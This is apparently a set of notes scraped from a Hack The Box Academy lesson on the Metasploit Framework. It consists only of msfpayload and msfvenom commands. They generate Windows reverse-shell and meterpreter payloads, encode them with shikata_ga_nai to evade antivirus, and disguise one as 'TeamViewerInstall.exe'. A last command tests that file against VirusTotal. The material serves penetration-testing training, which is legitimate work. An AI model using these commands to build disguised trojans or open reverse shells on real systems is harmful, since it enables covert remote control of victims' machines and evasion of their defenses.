<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/39/section/409
// Platform Version: V1
// Module ID: 39
...
**Module Name:** Using the Metasploit Framework **Page Number:** 07
...
``` shell-session
ndefstathiou@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
...
``` shell-session
ndefstathiou@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
...
``` shell-session
ndefstathiou@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
...
``` shell-session
ndefstathiou@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
...
``` shell-session
ndefstathiou@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
...
``` shell-session
ndefstathiou@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
